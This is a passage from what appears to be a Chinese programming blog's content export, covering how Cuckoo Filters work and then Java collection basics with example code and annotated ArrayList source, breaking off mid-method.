2、提供了比传统布隆过滤器更高的查找性能，即使在接近满的情况下（比如空间利用率达到 95% 的时候）；\n- 3、相比其他支持删除的 Filter 更容易实现；\n- 4、如果要求误判率小于3%，那么在许多实际应用中，它比布隆过滤器占用的空间更小。\n\n为了达到以上效果，Cuckoo Filter 对原 Cuckoo Hash 做了如下改变：\n\n1. 为了提高桶的利用率，使用多路哈希桶。\n2. 为了减少内存的使用，只存储 key 指纹。\n\n### 原理\n\n布谷鸟过滤器的布谷鸟哈希表的基本单位称为**条目（entry）**，每个条目存储一个**指纹（fingerprint）**\n\n**指纹：**对插入的 key 使用一个哈希函数生成的 n 位比特位，n 的具体大小由所能接受的误判率来设置，论文中的例子使用的是 8 bits 的指纹大小。牺牲了一定精度，但是换取了空间。\n\n与布谷鸟哈希不同，布谷鸟过滤器采取了两个**并不独立的哈希函数**，具体的布谷鸟过滤器位置计算公式：\n\n```python\nf = fingerprint(x)\ni1 = hash(x)\ni2 = i1 ⊕ hash(f)\n\n# i1 和 i2 即为计算出来两个桶的索引\n```\n\n**为什么采用并不独立的哈希函数？又为什么需要用到异或呢？**\n\n布谷鸟过滤器插入元素时会有频繁的踢出操作，当某个值 x 被踢出时，需要找到另外一个位置。 Cuckoo Hash 是通过额外哈希函数作用于 x 计算而出：`i2`。\n\n但在 Cuckoo Filter 中为了节省内存，保存的是定长的指纹 `finger(x)` 而非原值 x。当 x 被踢出时，如何找到其另外一个位置？直观的，我有两种想法：\n\n- 方法一：通过 `h2(finger(x))` 计算出另外一个位置。但这样在计算第二个位置时，相当于将原数据空间强行压缩到了指纹空间，会损失很多信息，加大碰撞概率。\n\n- 方法二：在值中记下另外一个位置`(finger,other position)`，但这样空间占用会大大增加。\n\nCuckoo Filter 用了一个巧妙地做法，将**位置** `i1`和该位置里面存储的“指纹”信息的 Hash值 `hash(f)` 进行**异或**得到另外一个位置。\n\n- 因为异或的自反性：`A ⊕ B ⊕ B = A`\n\n- 这样就不需要知道当前的位置是 i1 还是 i2，只需要将当前的位置和该位置里面存储的“指纹”信息的Hash值进行异或计算就可以得到另一个位置。\n- 而且只需要确保 hash(f) != 0 就可以确保 i1 != i2，如此就不会出现自己踢自己导致死循环的问题。\n\n**为什么 i1 不直接和指纹 f 进行异或 来计算 i2 ？**\n\n- 如果直接进行异或处理(i2 = i1 ⊕ f)，那么很可能 i1 和 i2 的位置相隔很近\n- 因为指纹 f 一般位数比较少，比如 8 bit。如果按照这种方法，即是在原位置 ±2^8 = 256 的范围内找到另一个位置，异或只会改变低 8 bit 的值。这个范围太小了，不利于均衡散列。尤其是在比较小的 hash 表中，这样无形之中增加了碰撞的概率。\n\n###  插入\n\n![](https://img.jwt1399.top/img/image-20220330223308276.png)\n\n假设布谷鸟过滤器里面有两个 hash 表 T1、T2，两个 hash 表，对应一个 hash 函数 H1\n\n具体的插入步骤如下：[布谷鸟过滤器动态演示](file:///Users/jianjian/Desktop/cuckoo/index.html)\n\n1. 当一个不存在的元素插入的时候，会先根据 H1 计算出其在 T1 表的位置 i1，如果该位置为空则可以放进去。\n2. 如果该位置不为空，则根据公式计算出其在 T2 表的位置 i2，如果该位置为空则可以放进去。\n3. 如果 T1 表和 T2 表的位置元素都不为空，那么就随机的选择一个 hash 表将其元素踢出。\n4. 被踢出的元素会去找自己的另一个位置，如果被占了也会随机选择一个将其踢出，被踢出的元素又会去找自己的另一个位置\n5. 如果出现循环踢出导致放不进元素的情况，那么会设置一个阈值，超出了某个阈值，就认为这个 hash 表已经几乎满了，这时候就需要对它进行扩容，重新放置所有元素。\n\n![Cuckoo Filter Insert](https://img.jwt1399.top/img/20210228113219.png)\n\n如果想要插入一个元素 Z 到过滤器里：\n\n1. 首先会将 Z 进行 hash 计算，发现 T1 和 T2 对应的槽位1和槽位2都已经被占了；\n2. 随机将 T1 中的槽位1中的元素 X 踢出，X 的 T2 对应的槽位4已经被元素 3 占了；\n3. 将 T2 中的槽位4中的元素 3 踢出，元素 3 在 hash 计算之后发现 T1 的槽位6是空的，那么将元素3放入到 T1 的槽位6中。\n\n实际上布谷鸟过滤器中只会存储元素的几个 bit ，称作指纹信息。这里是牺牲了数据的精确性换取了空间效率。\n\n上面的实现方案中，hash 表中每个槽位只能存放一个元素，空间利用率只有 50%\n\n布谷鸟过滤器中每个槽位可以存放多个元素，从一维变成了二维。当每个槽位可以存放 2，4，8 个元素的时候，空间利用率就会飙升到 84%，95%，98%\n\n如下图，表示的是一个二维数组，每个槽位可以存放 4 个元素，和上面的实现有所不同的是，没有采用两个数组来存放，而是只用了一个\n\n![](https://img.jwt1399.top/img/20210228113226.png)\n\n### 查找\n\n![](https://img.jwt1399.top/img/image-20220330223231679.png)\n\n布谷鸟过滤器的查找过程很简单\n\n- 给定一个项 x，算法首先根据插入公式，计算 x 的指纹和两个候选桶 i1 和 i2\n- 然后读取这两个桶：如果任意桶与现有指纹匹配，则布谷鸟过滤器返回 true，否则过滤器返回 false。\n- 只要不发生桶溢出，就可以确保没有假阴性。\n\n### 删除\n\n![](https://img.jwt1399.top/img/image-20220330223212233.png)\n\n- 标准布隆过滤器不能删除，因此删除单个项需要重建整个过滤器\n- 而计数布隆过滤器需要更多的空间\n- 布谷鸟过滤器就像计数布隆过滤器，可以通过从哈希表删除相应的指纹，其他具有类似删除过程的过滤器比布谷鸟过滤器更复杂。\n\n具体删除的过程也很简单\n\n- 检查给定项的两个候选桶；如果任何桶中的指纹匹配，则从该桶中删除匹配指纹的一份副本。\n\n对重复数据进行限制：如果需要布谷鸟过滤器支持删除，它必须知道一个数据插入过多少次。不能让同一个数据插入 kb+1 次。其中 k 是 hash 函数的个数，b 是一个下标的位置能放几个元素。\n\n比如 2 个 hash 函数，一个二维数组，它的每个下标最多可以插入 4 个元素。那么对于同一个元素，最多支持插入 8 次。\n\n### 缺点\n\n- **删除不完美，存在误删的概率。**删除的时候只是删除了一份指纹副本，并不能确定此指纹副本是要删除的 key 的指纹。同时这个问题也导致了假阳性的情况。\n- **插入复杂度比较高。**随着插入元素的增多，复杂度会越来越高，因为存在桶满，踢出的操作，所以需要重新计算，但综合来讲复杂度还是常数级别。\n- **存储空间的大小必须为2的指数**的限制让空间效率打了折扣。\n- **同一个元素最多插入kb次**，（k指哈希函数的个数，b指的桶中能装指纹的个数也可以说是桶的尺寸大小）如果布谷鸟过滤器支持删除，则必须存储同一项的多个副本。 插入同一项kb+1次将导致插入失败。 这类似于计数布隆过滤器，其中重复插入会导致计数器溢出。\n\n### 参考\n\n- [布谷鸟过滤器（Cuckoo Filter）](https://www.cnblogs.com/zhaodongge/p/15067657.html)\n- [基于原论文，我实现了一个更全面的布谷鸟过滤器 ](https://segmentfault.com/a/1190000039296155)\n- [Go语言实现布谷鸟过滤器](https://www.luozhiyun.com/archives/453)\n- [【分布式】Bloom Filter 与 Cuckoo Filter](https://zhuanlan.zhihu.com/p/131285273)\n- 论文：[布谷鸟过滤器：实际上优于布隆过滤器 (linvon.cn)](http://www.linvon.cn/posts/cuckoo/)\n- CPP实现布谷鸟过滤器：https://github.com/efficient/cuckoofilter\n- [Cuckoo Hashing Visualization :: Laszlo Kozma (lkozma.net)](http://www.lkozma.net/cuckoo_hashing_visualization/)\n- [布隆，牛逼！布谷鸟，牛逼！](https://segmentfault.com/a/1190000039156246)\n- [布谷鸟哈希和布谷鸟过滤器 | 木鸟杂记](https://www.qtmuniao.com/2021/12/07/cuckoo-hash-and-cuckoo-filter)\n\n## 两种过滤器比较\n\n![](https://img.jwt1399.top/img/1617168-20210727195622317-1553292086.png)\n\n上图是布谷鸟过滤器其他过滤器比较，假阳性率与每个元素的空间成本。\n\n对于低假阳性率（低于3%），布谷鸟过滤器比空间优化的布隆过滤器每个元素需要更少的存储空间。\n\n\n\n## ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["数据结构"],"categories":["结构-算法"]},{"title":"Java-集合","url":"/posts/6773.html","content":"\n##  前言\n\n哈喽！大家好，我是小简。今天开始学习《Java-集合》，此系列是我做的一个 “Java 从 0 到 1 ” 实验，给自己一年左右时间，按照我自己总结的 [Java-学习路线](https://jwt1399.top/posts/29829.html)，从 0 开始学 Java 知识，并不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 🚩时间安排：预计7天更新完\n- [x] 🎯开始时间：03-20\n- [x] 🎉结束时间：03-28\n- [x] 🍀总结：超时啦！这周花了一半时间看论文，耽搁啦！集合这章节是难点也是重点，算是勉勉强强算学完了，还不是很熟，后续再加强吧。\n\n## 零、集合简介\n\n### 集合的好处\n\n前面我们保存多个数据使用的是数组，但是数组有不足的地方，我们分析一下\n\n- 数组\n  - 1)长度开始时必须指定，而且一旦指定，不能更改\n  - 2)保存的必须为同一类型的元素\n  - 3)使用数组进行增加/删除元素比较麻烦\n- 集合\n  - 1)可以动态保存任意多个对象，使用比较方便!\n  - 2)提供了一系列方便的操作对象的方法: add、remove、set、get等\n  - 3)使用集合添加，删除新元素简洁了\n\n### 集合的框架体系\n\nJava 的集合类很多，主要分为两大类(单列集合和双列集合)\n\n| 单列集合 | 双列集合 |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](https://img.jwt1399.top/img/image-20220320114407307.png) | ![](https://img.jwt1399.top/img/image-20220320114413942.png) |\n\n## 一、Collection\n\n### 特点\n\n```java\npublic interface Collection<E> extends Iterable< E>\n```\n\n- Collection 实现子类可以存放多个元素，每个元素可以是 Object\n- Collection 的实现类，有些可以存放重复的元素，有些不可以\n- Collection 的实现类，有些是有序的(List)，有些不是有序(Set)\n\n- Collection 接口**没有直接的实现子类**，是通过它的子接口 List 和 Set 来实现的\n\n### 常用方法\n\n- add() 添加单个元素\n- remove() 删除指定元素\n  - remove(index) //删除指定索引元素\n  - remove(Object) //删除指定某个元素\n- contains() 查找元素是否存在\n- size() 获取元素个数\n- isEmpty() 判断是否为空\n- clear() 清空\n- addAll(Collection) 添加多个元素\n- containsAll(Collection) 查找多个元素是否都存在\n- removeAll(Collection)  删除多个元素\n\n```java\npackage com.jwt.collection_;\n\nimport java.util.ArrayList;\nimport java.util.Collection;\n\npublic class CollectionMethod {\n    public static void main(String[] args) {\n        // 说明：以Arraycol 实现类来演示\n        Collection col = new ArrayList();\n        // add:添加单个元素\n        col.add(\"jack\");\n        col.add(10);//col.add(new Integer(10))\n        col.add(true);\n        System.out.println(\"col=\" + col);\n        // remove:删除指定元素\n        col.remove(0);//删除第一个元素\n        System.out.println(\"col=\" + col);\n        col.remove(true);//指定删除某个元素\n        System.out.println(\"col=\" + col);\n        // contains:查找元素是否存在\n        System.out.println(col.contains(\"jack\"));//F\n        // size:获取元素个数\n        System.out.println(col.size());//1\n        // isEmpty:判断是否为空\n        System.out.println(col.isEmpty());//F\n        // clear:清空\n        col.clear();\n        System.out.println(\"col=\" + col);\n        // addAll:添加多个元素\n        Collection col2 = new ArrayList();\n        col2.add(\"红楼梦\");\n        col2.add(\"三国演义\");\n        col.addAll(col2);\n        System.out.println(\"col2=\" + col2);\n        System.out.println(\"col=\" + col);\n        // containsAll:查找多个元素是否都存在\n        System.out.println(col.containsAll(col2));//T\n        // removeAll：删除多个元素\n        col.add(\"聊斋\");\n        col.removeAll(col2);\n        System.out.println(\"col=\" + col);//[聊斋]\n    }\n}\n```\n\n### 遍历\n\n#### Iterator遍历\n\n##### 简介\n\n- Iterator 对象称为迭代器， 主要仅用于遍历 Collection 集合中的元素，Iterator 本身并不存放对象。\n- 所有实现了Collection 接口的集合类都有一个 iterator() 方法，用以返回一个实现了Iterator 接口的对象， 即可以返回一个迭代器。\n\n##### Iterator 接口方法\n\n- literator() 得到一个集合的迭代器\n- hasNext() 判断是否还有下一个元素\n- next() 下移并将下移以后集合位置上的元素返回\n- remove() 移除集合元素\n\n在调用 iterator.next() 方法之前必须要调用 iterator.hasNext() 进行检测。若不调用，如果下一条记录无效，直接调用 it.next() 会抛出NoSuchElementException异常。\n\n```java\npackage com.jwt.collection_;\n\nimport java.util.ArrayList;\nimport java.util.Collection;\nimport java.util.Iterator;\n\npublic class CollectionIterator {\n    public static void main(String[] args) {\n        Collection col = new ArrayList();\n        col.add(new Book_(\"三国演义\", \"罗贯中\", 10.1));\n        col.add(new Book_(\"小李飞刀\", \"古龙\", 5.1));\n        col.add(new Book_(\"红楼梦\", \"曹雪芹\", 34.6));\n        System.out.println(\"col=\" + col);\n        //1. 先得到col 对应的迭代器\n        Iterator iterator = col.iterator();\n        //2. 使用while 循环遍历  快捷键：itit\n        while (iterator.hasNext()) {//判断是否还有数据\n            Object obj = iterator.next();//读取当前集合数据元素\n            System.out.println(\"col=\" + obj);\n        }\n        //3. 当退出while 循环后, 这时iterator 迭代器，指向最后的元素\n        // iterator.next();//NoSuchElementException\n        //4. 如果希望再次遍历，需要重置我们的迭代器\n        iterator = col.iterator();\n        System.out.println(\"===第二次遍历===\");\n        while (iterator.hasNext()) {\n            Object obj = iterator.next();\n            System.out.println(\"col=\" + obj);\n        }\n        //5.移除集合元素\n        iterator = col.iterator();\n        System.out.println(\"===移除集合元素===\");\n        while(iterator.hasNext()){\n            Object obj = iterator.next();\n            iterator.remove();\n            System.out.println(\"col=\" + col);\n        }\n    }\n}\n\nclass Book_ {\n    private String name;\n    private String author;\n    private double price;\n\n    public Book_(String name, String author, double price) {\n        this.name = name;\n        this.author = author;\n        this.price = price;\n    }\n\n    @Override\n    public String toString() {\n        return \"Book_{\" +\n                \"name='\" + name + '\\'' +\n                \", author='\" + author + '\\'' +\n                \", price=\" + price +\n                '}';\n    }\n}\n```\n\n#### 增强for遍历\n\n- 增强 for 循环， 可以代替 iterator 迭代器， 增强 for 底层就是迭代器\n\n- 增强 for 就是简化版的 iterator，本质一样。只能用于遍历集合或数组。\n\n- 基本语法：`for(元素类型 元素名:集合名或数组名) {}`\n\n```java\npackage com.jwt.collection_;\n\nimport java.util.ArrayList;\nimport java.util.Collection;\n\npublic class CollectionFor {\n    public static void main(String[] args) {\n        Collection col = new ArrayList();\n        col.add(new Book_(\"三国演义\", \"罗贯中\", 10.1));\n        col.add(new Book_(\"小李飞刀\", \"古龙\", 5.1));\n        col.add(new Book_(\"红楼梦\", \"曹雪芹\", 34.6));\n        System.out.println(\"col=\" + col);\n\t\t\t\t//增强for  快捷键：I\n        for (Object o :col) {\n            System.out.println(\"col=\" + o);\n        }\n    }\n}\n\nclass Book_ {\n    private String name;\n    private String author;\n    private double price;\n\n    public Book_(String name, String author, double price) {\n        this.name = name;\n        this.author = author;\n        this.price = price;\n    }\n\n    @Override\n    public String toString() {\n        return \"Book_{\" +\n                \"name='\" + name + '\\'' +\n                \", author='\" + author + '\\'' +\n                \", price=\" + price +\n                '}';\n    }\n}\n```\n\n## I、List\n\n### 特点\n\nList 接口是 Collection 接口的子接口\n\n- List 集合类中元素有序(即添加顺序和取出顺序一致)、且可重复\n\n```java\nList list = new ArrayList();\nlist.add(\"tom\");\nlist.add(\"tom\");//可以重复\nlist.add(\"mary\");\nlist.add(\"jwt\");\n```\n\n- List 集合中的每个元素都有其对应的顺序索引，即支持索引。\n\n```java\nSystem.out.println(list.get(3));//jwt\n```\n\n- List 接口实现类常用的有：ArrayList、LinkedList、Vector\n\n### 常用方法\n\n- add() 添加单个元素\n- add(int index, Object ele) 在 index 位置插入 ele 元素\n- addAll(int index, Collection eles) 从 index 位置开始将 eles 中的所有元素添加进来\n- get(int index) 获取指定 index 位置的元素\n-  indexOf(Object obj) 返回 obj 在集合中首次出现的位置\n- lastIndexOf(Object obj) 返回 obj 在当前集合中末次出现的位置\n- remove(int index) 移除指定 index 位置的元素，并返回此元素\n- set(int index, Object ele) 设置指定 index 位置的元素为 ele , 相当于是替换\n- subList(int fromIndex, int toIndex)  返回从 [fromIndex,toIndex) 位置的子集合\n\n```java\npackage com.jwt.list_;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class ListMethod {\n    public static void main(String[] args) {\n        List list = new ArrayList();\n        list.add(\"张三丰\");\n        list.add(\"贾宝玉\");\n        // void add(int index, Object ele):在index 位置插入ele 元素\n        //在index = 1 的位置插入一个对象\n        list.add(1, \"简简\");\n        System.out.println(\"list=\" + list);\n        // boolean addAll(int index, Collection eles):从index 位置开始将eles 中的所有元素添加进来\n        List list2 = new ArrayList();\n        list2.add(\"jack\");\n        list2.add(\"tom\");\n        list.addAll(1, list2);\n        System.out.println(\"list2=\" + list2);\n        System.out.println(\"list=\" + list);\n        // Object get(int index):获取指定index 位置的元素\n        System.out.println(list.get(3));\n        // int indexOf(Object obj):返回obj 在集合中首次出现的位置\n        System.out.println(list.indexOf(\"tom\"));//2\n        // int lastIndexOf(Object obj):返回obj 在当前集合中末次出现的位置\n        list.add(\"简简\");\n        System.out.println(\"list=\" + list);\n        System.out.println(list.lastIndexOf(\"简简\"));\n        // Object remove(int index):移除指定index 位置的元素，并返回此元素\n        Object remove = list.remove(0);\n        System.out.println(\"remove = \" + remove);\n        System.out.println(\"list=\" + list);\n        // Object set(int index, Object ele):设置指定index 位置的元素为ele , 相当于是替换.\n        list.set(1, \"玛丽\");\n        System.out.println(\"list=\" + list);\n        // List subList(int fromIndex, int toIndex):返回从[fromIndex,toIndex) 位置的子集合\n        List returnlist = list.subList(0, 2);\n        System.out.println(\"returnlist=\" + returnlist);\n\n    }\n}\n```\n\n### 遍历方式\n\n```java\npackage com.jwt.list_;\n\nimport java.util.Iterator;\nimport java.util.LinkedList;\nimport java.util.List;\n\npublic class ListFor {\n    public static void main(String[] args) {\n        //List 接口的实现子类ArrayList、Vector、LinkedList\n        //List list = new ArrayList();\n        //List list = new Vector();\n        List list = new LinkedList();\n        list.add(\"jack\");\n        list.add(\"tom\");\n        list.add(\"鱼香肉丝\");\n        list.add(\"北京烤鸭子\");\n        //遍历\n        //1. 迭代器 快捷代码itit\n        Iterator iterator = list.iterator();\n        while (iterator.hasNext()) {\n            Object obj = iterator.next();\n            System.out.println(obj);\n        }\n\n        //2. 增强for 快捷代码I\n        System.out.println(\"=====增强for=====\");\n        for (Object o : list) {\n            System.out.println(\"o=\" + o);\n        }\n\n        //3. 使用普通for\n        System.out.println(\"=====普通for====\");\n        for (int i = 0; i < list.size(); i++) {\n            System.out.println(\"对象=\" + list.get(i));\n        }\n    }\n}\n```\n\n### 练习\n\n##### 题1\n\n添加10个以上的元素，在2号位插入一个元素\"简简\"，获得第5个元素，删除第6个元素，修改第7个元素，在使用迭代器遍历集合，要求：使用 List 的实现类 ArrayList 完成。\n\n```java\npackage com.jwt.list_;\n\nimport java.util.ArrayList;\nimport java.util.Iterator;\nimport java.util.List;\n\npublic class ListExercise {\n    public static void main(String[] args) {\n        List list = new ArrayList();\n        for (int i = 0; i < 10; i++) {\n            list.add(i);\n        }\n        System.out.println(list);\n        //在2号位插入一个元素\n        list.add(1,\"简简\");\n        System.out.println(list);\n        //获得第5个元素\n        System.out.println(list.get(4));\n        //删除第6个元素\n        list.remove(5);\n        System.out.println(list);\n        //修改第7个元素\n        list.set(6,\"简简\");\n        System.out.println(list);\n        //迭代器遍历\n        Iterator iterator = list.iterator();\n        while (iterator.hasNext()) {\n            Object next = iterator.next();\n            System.out.println(next);\n        }\n    }\n}\n```\n\n##### 题2\n\n使用 List 的实现类添加三本图书，并遍历，打印如下效果\n名称: xx\t价格: xx\t作者: xx\n名称: xx\t价格: xx\t作者: xx\n名称: xx\t价格: xx\t作者: xx\n\n- 1)按价格排序，从低到高(使用冒泡法)\n\n- 2)要求使用ArrayList、LinkedList 和Vector三种集合实现\n\n```java\npackage com.jwt.list_;\n\nimport java.util.List;\nimport java.util.Vector;\n\npublic class ListExercise02 {\n    public static void main(String[] args) {\n        //List<Book2> books = new ArrayList<Book2>();\n        //LinkedList<Book2> books = new LinkedList<Book2>();\n        Vector<Book2> books = new Vector<>();\n        books.add(new Book2(\"红楼梦\", \"曹雪芹\", 90));\n        books.add(new Book2(\"西游记\", \"吴承恩\", 100));\n        books.add(new Book2(\"水浒传\", \"施耐庵\", 80));\n        System.out.println(\"==排序前==\");\n        for (Object o : books) {\n            System.out.println(o);\n        }\n        System.out.println(\"==排序后==\");\n        bubblesort(books);\n        for (Object o : books) {\n            System.out.println(o);\n        }\n    }\n    //冒泡排序\n    public static void bubblesort(List list) {\n        int listSize = list.size();\n        for (int i = 0; i < listSize - 1; i++) {\n            for (int j = 0; j < listSize - 1 - i; j++) {\n                //取出对象Book\n                Book2 book1 = (Book2) list.get(j);\n                Book2 book2 = (Book2) list.get(j + 1);\n                if (book1.getPrice() > book2.getPrice()) {//交换\n                    list.set(j, book2);\n                    list.set(j + 1, book1);\n                }\n            }\n        }\n    }\n}\n\nclass Book2{\n    private String name;\n    private String author;\n    private double price;\n\n    public Book2(String name, String author, double price) {\n        this.name = name;\n        this.author = author;\n        this.price = price;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getAuthor() {\n        return author;\n    }\n\n    public void setAuthor(String author) {\n        this.author = author;\n    }\n\n    public double getPrice() {\n        return price;\n    }\n\n    public void setPrice(double price) {\n        this.price = price;\n    }\n\n    @Override\n    public String toString() {\n        return \"名称：\" + name + \"\\t价格:\" + price + \"\\t作者\" + author ;\n    }\n}\n```\n\n## 1.1 ArrayList\n\n### 简介\n\n![](https://img.jwt1399.top/img/image-20220321110347767.png)\n\n```java\npublic class ArrayList<E> extends AbstractList<E>\n        implements List<E>, RandomAccess, Cloneable, java.io.Serializable{}\n```\n\n- ArrayList 的底层是数组队列，相当于动态数组。与 Java 中的数组相比，它的容量能动态增长。\n\n- ArrayList 继承于 `AbstractList` ，实现了 `List`, `RandomAccess`, `Cloneable`, `java.io.Serializable` 这些接口。\n  - `RandomAccess` 是一个标志接口，表明实现这个这个接口的 List 集合是支持快速随机访问的。在 ArrayList 中，我们即可以通过元素的序号快速获取元素对象，这就是快速随机访问。\n  - `ArrayList` 实现了 `Cloneable` 接口 ，即覆盖了函数`clone()`，能被克隆。\n  - `ArrayList` 实现了 `java.io.Serializable`接口，这意味着`ArrayList`支持序列化，能通过序列化去传输。\n\n### 特点\n\n- ArrayList 底层实现是一个 `Object` 数组\n\n  - `transient Object[] elementData;`\n\n- ArrayList 只能存储对象引用类型，也就是说当我们需要装载的数据是诸如 `int`、`float` 等基本数据类型的时候，必须把它们转换成对应的包装类\n\n- ArrayList 可以加入 null，并且可以多个 null\n\n  ```java\n  list.add(null);\n  list.add(\"jianjian\");\n  list.add(null);\n  ```\n\n- ArrayList 基本等同于 Vector，除了 ArrayList 是线程不安全(执行效率高)，在多线程情况下，不建议使用 ArrayList\n\n  ```java\n  //ArrayList 是线程不安全，没有 synchronized\n  //add源码\n  public boolean add(E e) {\n    ensureCapacityInternal(size + 1);  \n    elementData[size++] = e;\n    return true;\n  }\n  ```\n\n### 核心源码\n\n```java\npublic class ArrayList<E> extends AbstractList<E>\n        implements List<E>, RandomAccess, Cloneable, java.io.Serializable\n{\n    private static final long serialVersionUID = 8683452581122892189L;\n\n    /**\n     * 默认初始容量大小\n     */\n    private static final int DEFAULT_CAPACITY = 10;\n\n    /**\n     * 空数组（用于空实例）。\n     */\n    private static final Object[] EMPTY_ELEMENTDATA = {};\n\n     //用于默认大小空实例的共享空数组实例。\n    //我们把它从EMPTY_ELEMENTDATA数组中区分出来，以知道在添加第一个元素时容量需要增加多少。\n    private static final Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = {};\n\n    /**\n     * 保存ArrayList数据的数组\n     */\n    transient Object[] elementData; // non-private to simplify nested class access\n\n    /**\n     * ArrayList 所包含的元素个数\n     */\n    private int size;\n\n    /**\n     * 带初始容量参数的构造函数（用户可以在创建ArrayList对象时自己指定集合的初始大小）\n     */\n    public ArrayList(int initialCapacity) {\n        if (initialCapacity > 0) {\n            //如果传入的参数大于0，创建initialCapacity大小的数组\n            this.elementData = new Object[initialCapacity];\n        } else if (initialCapacity == 0) {\n            //如果传入的参数等于0，创建空数组\n            this.elementData = EMPTY_ELEMENTDATA;\n        } else {\n            //其他情况，抛出异常\n            throw new IllegalArgumentException(\"Illegal Capacity: \"+\n                                               initialCapacity);\n        }\n    }\n\n    /**\n     *默认无参构造函数\n     *DEFAULTCAPACITY_EMPTY_ELEMENTDATA 为0.初始化为10，也就是说初始其实是空数组 当添加第一个元素的时候数组容量才变成10\n     */\n    public ArrayList() {\n        this.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;\n    }\n\n    /**\n     * 构造一个包含指定集合的元素的列表，按照它们由集合的迭代器返回的顺序。\n     */\n    public ArrayList(Collection<? extends E> c) {\n        //将指定集合转换为数组\n        elementData = c.toArray();\n        //如果elementData数组的长度不为0\n        if ((size = elementData.length) != 0) {\n            // 如果elementData不是Object类型数据（c.toArray可能返回的不是Object类型的数组所以加上下面的语句用于判断）\n            if (elementData.getClass() != Object[].class)\n                //将原来不是Object类型的elementData数组的内容，赋值给新的Object类型的elementData数组\n                elementData = Arrays.copyOf(elementData, size, Object[].class);\n        } else {\n            // 其他情况，用空数组代替\n            this.elementData = EMPTY_ELEMENTDATA;\n        }\n    }\n\n    /**\n     * 修改这个ArrayList实例的容量是列表的当前大小。 应用程序可以使用此操作来最小化ArrayList实例的存储。\n     */\n    public void trimToSize() {\n        modCount++;\n        if (size < elementData.length) {\n            elementData = (size == 0)\n              ? EMPTY_ELEMENTDATA\n              : Arrays.copyOf(elementData, size);\n        }\n    }\n    //下面是ArrayList的扩容机制\n    //ArrayList的扩容机制提高了性能，如果每次只扩充一个，\n    //那么频繁的插入会导致频繁的拷贝，降低性能，而ArrayList的扩容机制避免了这种情况。\n    /**\n     * 如有必要，增加此ArrayList实例的容量，以确保它至少能容纳元素的数量\n     * @param   minCapacity   所需的最小容量\n     */\n    public void ensureCapacity(int minCapacity) {\n        //如果是true，minExpand的值为0，如果是false,minExpand的值为10\n        int minExpand = (elementData != DEFAULTCAPACITY_EMPTY_ELEMENTDATA)\n            // any size if not default element table\n            ? 0\n            // larger than default for default empty table. It's already\n            // supposed to be at default size.\n            : DEFAULT_CAPACITY;\n        //如果最小容量大于已有的最大容量\n        if (minCapacity > minExpand) {\n            ensureExplicitCapacity(minCapacity);\n        }\n    }\n    //得到最小扩容量\n    private void ensureCapacityInternal(int minCapacity) {\n        if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) {\n              // 获取“默认的容量”和“传入参数”两者之间的最大值\n            minCapacity = Math.max(DEFAULT_CAPACITY, minCapacity);\n        }\n\n        ensureExplicitCapacity(minCapacity);\n    }\n    //判断是否需要扩容\n    private void ensureExplicitCapacity(int minCapacity) {\n        modCount++;\n\n        // overflow-conscious code\n        if (minCapacity - elementData.length > 0)\n            //调用grow方法进行扩容，调用此方法代表已经开始扩容了\n            grow(minCapacity);\n    }\n\n    /**\n     * 要分配的最大数组大小\n     */\n    private static final int MAX_ARRAY_SIZE = Integer.MAX_VALUE - 8;\n\n    /**\n     * ArrayList扩容的核心方法。\n     */\n    private void grow(int minCapacity) {\n        // oldCapacity为旧容量，newCapacity为新容量\n        int oldCapacity = elementData.length;\n        //将oldCapacity 右移一位，其效果相当于oldCapacity /2，\n        //我们知道位运算的速度远远快于整除运算，整句运算式的结果就是将新容量更新为旧容量的1.5倍，\n        int newCapacity = oldCapacity + (oldCapacity >> 1);\n        //然后检查新容量是否大于最小需要容量，若还是小于最小需要容量，那么就把最小需要容量当作数组的新容量，\n        if (newCapacity - minCapacity < 0)\n            newCapacity = minCapacity;\n        //再检查新容量是否超出了ArrayList所定义的最大容量，\n        //若超出了，则调用hugeCapacity()来比较minCapacity和 MAX_ARRAY_SIZE，\n        //如果minCapacity大于MAX_ARRAY_SIZE，则新容量则为Interger.MAX_VALUE，否则，新容量大小则为 MAX_ARRAY_SIZE。\n        if (newCapacity - MAX_ARRAY_SIZE > 0)\n            newCapacity = hugeCapacity(minCapacity);\n        // minCapacity is usually close to size, so this is a win:\n        elementData = Arrays.copyOf(elementData, newCapacity);\n    }\n    //比较minCapacity和 MAX_ARRAY_SIZE\n    private static int hugeCapacity(int minCapacity) {\n        if (minCapacity < 0) // overflow\n            throw new OutOfMemoryError();\n        return (minCapacity > MAX_ARRAY_SIZE) ?\n            Integer.MAX_VALUE :\n            MAX_ARRAY_SIZE;\n    }\n\n    /**\n     *返回此列表中的元素数。\n     */\n    public int size() {\n        return size;\n    }\n\n    /**\n     * 如果此列表不包含元素，则返回 true 。\n     */\n    public boolean isEmpty() {\n        //注意=和==的区别\n        return size == 0;\n    }\n\n    /**\n     * 如果此列表包含指定的元素，则返回true 。\n     */\n    public boolean contains(Object o) {\n        //indexOf()方法：返回此列表中指定元素的首次出现的索引，如果此列表不包含此元素，则为-1\n        return indexOf(o) >= 0;\n    }\n\n    /**\n     *返回此列表中指定元素的首次出现的索引，如果此列表不包含此元素，则为-1\n     */\n    public int indexOf(Object o) {\n        if (o == null) {\n            for (int i = 0; i < size; i++)\n                if (elementData[i]==null)\n                    return i;\n        } else {\n            for (int i = 0; i < size; i++)\n                //equals()方法比较\n                if (o.equals(elementData[i]))\n                    return i;\n        }\n        return -1;\n    